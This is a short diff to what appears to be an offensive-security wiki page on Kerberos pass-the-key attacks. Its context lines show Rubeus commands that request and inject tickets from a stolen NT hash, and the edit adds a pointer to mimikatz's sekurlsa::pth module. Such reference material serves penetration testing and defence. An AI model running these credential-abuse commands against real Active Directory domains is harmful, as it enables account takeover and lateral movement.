@@ -48,7 +48,7 @@ Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$NThash /ptt
 Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$NThash /ptt
 ```
 
-An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz).
+An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz) with [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth).
 
 ```bash
 # with an NT hash
